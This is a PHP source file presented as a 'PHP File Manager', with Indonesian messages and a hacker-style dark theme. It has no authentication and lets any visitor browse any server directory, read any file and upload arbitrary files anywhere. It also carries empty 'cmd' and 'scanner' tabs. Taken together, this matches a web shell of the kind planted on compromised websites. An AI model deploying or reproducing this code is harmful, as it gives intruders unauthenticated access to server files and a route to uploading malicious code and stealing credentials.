<?php
ini_set('log_errors', 1);
ini_set('display_errors', 0);

function setCookieDir($dir) {
    setcookie('current_dir', $dir, time() + 7200, '/'); // Set cookie for 2 hours
}

function getCookieDir() {
    return isset($_COOKIE['current_dir']) ? $_COOKIE['current_dir'] : getcwd();
}

function sanitizePath($path) {
    return str_replace("\\", "/", htmlspecialchars($path));
}

function path() {
    $dir = isset($_GET['dir']) ? sanitizePath($_GET['dir']) : getCookieDir();
    $dir = realpath($dir);
    
    if ($dir && is_dir($dir)) {
        chdir($dir);
        setCookieDir($dir);
    } else {
        $dir = getcwd();
        setCookieDir($dir);
    }

    return $dir;
}

function renderFileList($dir) {
    if (!is_dir($dir)) {
        return "<p>Direktori tidak ditemukan: " . htmlspecialchars($dir) . "</p>";
    }

    function parentDir($dir) {
        return realpath(dirname($dir)) ?: $dir;
    }

    function getFileInfo($path) {
        return [
            'name' => basename($path),
            'path' => $path,
            'owner' => fileowner($path),
            'group' => filegroup($path),
            'perms' => substr(decoct(fileperms($path) & 0777), -3),
            'modification_date' => date("Y-m-d H:i:s", filemtime($path))
        ];
    }

    $items = array_diff(scandir($dir), ['.', '..']);
    $parentPath = ($dir !== '/') ? parentDir($dir) : null;

    $directories = [];
    $files = [];

    if ($parentPath) {
        $directories[] = array_merge(getFileInfo($parentPath), [
            'type' => 'dir',
            'link' => "<a href='#' class='dir-link' data-dir='" . sanitizePath($parentPath) . "'>..</a>"
        ]);
    }

    foreach ($items as $item) {
        $itemPath = $dir . DIRECTORY_SEPARATOR . $item;
        $info = array_merge(getFileInfo($itemPath), ['link' => is_dir($itemPath) ? "<a href='#' class='dir-link' data-dir='" . sanitizePath($itemPath) . "'>$item</a>" : "<a href='#' class='file-link' data-file='" . sanitizePath($itemPath) . "'>$item</a>"]);

        if (is_dir($itemPath)) {
            $info['type'] = 'dir';
            $directories[] = $info;
        } elseif (is_file($itemPath)) {
            $info['type'] = 'file';
            $files[] = $info;
        }
    }

    $html = "<table class='table'><thead><tr><th>Name</th><th>Type</th><th>Owner</th><th>Group</th><th>Permissions</th><th>Modification Date</th></tr></thead><tbody>";

    foreach ($directories as $dir) {
        $html .= "<tr><td>{$dir['link']}</td><td>Directory</td><td>{$dir['owner']}</td><td>{$dir['group']}</td><td>{$dir['perms']}</td><td>{$dir['modification_date']}</td></tr>";
    }

    foreach ($files as $file) {
        $html .= "<tr><td>{$file['link']}</td><td>File</td><td>{$file['owner']}</td><td>{$file['group']}</td><td>{$file['perms']}</td><td>{$file['modification_date']}</td></tr>";
    }

    $html .= "</tbody></table>";

    return $html;
}

$dir = path();

if (isset($_GET['action'])) {
    switch ($_GET['action']) {
        case 'create_folder':
            if (isset($_POST['folder_name'])) {
                $folderName = sanitizePath($_POST['folder_name']);
                $newFolderPath = $dir . DIRECTORY_SEPARATOR . $folderName;
                if (!file_exists($newFolderPath)) {
                    mkdir($newFolderPath);
                } else {
                    echo "Folder sudah ada.";
                }
            }
            break;

        case 'create_file':
            if (isset($_POST['file_name'])) {
                $fileName = sanitizePath($_POST['file_name']);
                $newFilePath = $dir . DIRECTORY_SEPARATOR . $fileName;
                if (!file_exists($newFilePath)) {
                    touch($newFilePath);
                } else {
                    echo "File sudah ada.";
                }
            }
            break;

        case 'upload':
            if (isset($_FILES['upload_file'])) {
                $file = $_FILES['upload_file'];
                $targetFile = $dir . DIRECTORY_SEPARATOR . basename($file['name']);
                move_uploaded_file($file['tmp_name'], $targetFile);
            }
            break;

        case 'view':
            if (isset($_GET['file'])) {
                $file = sanitizePath($_GET['file']);
                if (file_exists($file)) {
                    $content = file_get_contents($file);
                    echo "<p>File Contents: " . htmlspecialchars($file) . "</p>";
                    echo '<pre>' . htmlspecialchars($content) . '</pre>';
                } else {
                    echo "<p>Unable to read file.</p>";
                }
            }
            break;
    }
    exit();
}

if (isset($_GET['dir'])) {
    echo renderFileList($dir);
    exit();
}

$fileListHtml = renderFileList($dir);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery.terminal/js/jquery.terminal.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery.terminal/css/jquery.terminal.min.css"/>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');

body {
    background: linear-gradient(135deg, #0d0d0d, #1a1a1a);
    color: #fff;
    font-family: 'Orbitron', sans-serif;
    justify-content: center;
    align-items: center;
    height: 100vh;
    padding: 15px;
}
::-webkit-scrollbar {
    width: 8px;
}

::-webkit-scrollbar-thumb {
    background-color: #0ff; /* Scrollbar color */
    border-radius: 5px;
}

::-webkit-scrollbar-thumb::horizontal {
    background-color: #0ff; /* Scrollbar color */
    border-radius: 5px;
}

.container {
    max-width: 90%; /* Increased width */
    background: rgba(20, 20, 20, 0.9);
    border-radius: 15px;
    box-shadow: 0 4px 15px rgba(0, 255, 255, 0.5);
    padding: 20px; /* Reduced padding */
    border: 1px solid #0ff;
}
a {
    color: #0ff;
    text-decoration: none !important;
}

a:hover {
    color:#00e5e5; 
    text-decoration: none !important;
    cursor:pointer;  
}

.btn {
    color: #fff;
    font-size: 12px;
    background-color: transparent;
    border: 1px dashed #0ff;
}

.btn:hover {
    color: #0ff;
}

.header {
    text-align: center;
    margin-bottom: 10px; /* Reduced margin */
}
.nav-pills .nav-link {
    border-radius: 10px;
    margin: 0 5px;
    color: #0ff;
    background: rgba(255, 255, 255, 0.1);
    border: 1px solid transparent;
    transition: background 0.3s, color 0.3s, border 0.3s;
    font-size: 12px;
}
.nav-pills .nav-link.active {
    color: #0d0d0d;
    background: #0ff;
    border-color: #0ff;
}
.nav-pills .nav-link:hover {
    color: #0d0d0d;
    background: rgba(0, 255, 255, 0.2);
    border-color: #0ff;
}
.tab-content {
    background: rgba(20, 20, 20, 0.9);
    border-radius: 10px;
    box-shadow: 0 4px 15px rgba(0, 255, 255, 0.5);
    padding: 20px; /* Reduced padding */
    border: 1px dashed #0ff;
}
.tab-pane {
    min-height: 300px;
}
.info-section {
    margin-top: 20px; /* Reduced margin */
    padding: 20px; /* Reduced padding */
    background: rgba(20, 20, 20, 0.9);
    border-radius: 10px;
    box-shadow: 0 4px 15px rgba(0, 255, 255, 0.5);
    border: 1px dashed #0ff;
    color: #0ff;
    display: flex;
    flex-direction: column;
    align-items: center;
}
.info-section .info-item {
    padding: 10px; /* Reduced padding */
    border: 1px dashed #0ff;
    border-radius: 10px;
    box-shadow: 0 4px 10px rgba(0, 255, 255, 0.5);
    margin-bottom: 10px; /* Reduced margin */
    width: 100%;
    text-align: left;
    background: rgba(0, 255, 255, 0.1);
    font-size: 12px;
    color: #fff;
}
.info-section .info-item:last-child {
    margin-bottom: 0;
}
.table {
    background: rgba(20, 20, 20, 0.9);
    color: #0ff;
    border-collapse: separate;
    border-spacing: 0;
}

.table th, .table td {
    border: 1px solid #0ff; /* Set border color */
    padding: 10px; /* Adjust padding if needed */
}

.table thead {
    background: rgba(0, 255, 255, 0.2); /* Lighter background for header */
}

.table thead th {
    color: #0d0d0d; /* Darker color for header text */
    font-weight: bold;
}

.table tbody tr:nth-child(even) {
    background: rgba(0, 255, 255, 0.05); /* Slightly different background for even rows */
}

.table tbody tr:nth-child(odd) {
    background: rgba(20, 20, 20, 0.9); /* Darker background for odd rows */
}

.table tbody td {
    color: #0ff; /* Set text color for table body */
}
.modal-content {
    background: #0d0d0d;
    color: #fff;
    border: 1px solid #0ff;
    border-radius: 10px;
}
.modal-header, .modal-footer {
    border-bottom: none;
    border-top: none;
}
.modal-header {
    background: rgba(0, 255, 255, 0.1);
}
.modal-footer {
    background: rgba(255, 255, 255, 0.1);
}
.modal-body {
    background: rgba(0, 0, 0, 0.7);
}
.modal-title {
    color: #0ff;
}
.terminal {
    background-color: black;
    color: #0ff; /* Bright green text color */
    font-family: 'Courier New', Courier, monospace;
    font-size: 14px;
    line-height: 1.5;
    padding: 20px;
    margin: 0 auto;
    height: 600px;
    word-wrap: break-word;
    border: 1px solid #0ff; /* Optional border for better definition */
    border-radius: 5px; /* Optional rounded corners */
    border: 1px dashed #0ff;
}

.terminal-content {
    height: 100%;
    overflow-y: auto;
}

.terminal-form {
    display: flex;
    flex-direction: column;
}

.terminal-content::-webkit-scrollbar {
    width: 8px;
}

.terminal-content::-webkit-scrollbar-thumb {
    background-color: #0ff; /* Scrollbar color */
    border-radius: 5px;
}
.terminal-prompt {
    color: #0ff; /* Prompt text color */
    margin-right: 10px; /* Space between prompt and input field */
    white-space: nowrap; /* Prevents prompt from wrapping */
}

.terminal-input {
    border: none;
    background: transparent;
    color: #c5c5c5; /* Light gray text for input */
    font-family: 'Courier New', Courier, monospace;
    font-size: 14px;
    outline: none;
    flex: 1; /* Allows input to take remaining space */
    padding: 0;
    margin: 0;
    box-sizing: border-box; /* Includes padding in width calculation */
    width: 50%;
}

.terminal-input::placeholder {
    color: #666; /* Placeholder text color */
}
    </style>
</head>
<body>
<div class="container">
    <h2 class="text-center mb-4">PHP File Manager</h2>
    <!-- Your existing navigation and form code -->

    <div class="info-section mb-4">
        <div class="info-item">Info:</div>
        <div class="info-item">Info:</div>
        <div class="info-item">Current Directory : <span id="current-dir"><?php echo htmlspecialchars($dir); ?></span></div>
    </div>

    <div class="tab-content" id="pills-tabContent">
        <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
            <div id="file-list">
                <?php echo $fileListHtml; ?>
            </div>
        </div>
        <div class="tab-pane fade" id="cmd" role="tabpanel" aria-labelledby="cmd-tab">...</div>
        <div class="tab-pane fade" id="scanner" role="tabpanel" aria-labelledby="scanner-tab">...</div>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script>
    $(document).ready(function() {
    $(document).on('click', '.dir-link', function(event) {
        event.preventDefault();
        var dir = $(this).data('dir');
        
        $.get('?dir=' + encodeURIComponent(dir), function(data) {
            $('#file-list').html(data);
            $('#current-dir').text(dir);

            // Update cookie with the new directory
            document.cookie = "current_dir=" + encodeURIComponent(dir) + "; path=/; max-age=7200"; // 2 hours
        }).fail(function() {
            alert('Failed to load directory.');
        });
    });

    $(document).on('click', '.file-link', function(event) {
        event.preventDefault();
        var file = $(this).data('file');
        $.get('?action=view&file=' + encodeURIComponent(file), function(data) {
            alert(data);
        }).fail(function() {
            alert('Failed to load file.');
        });
    });
});
</script>
</body>
</html>
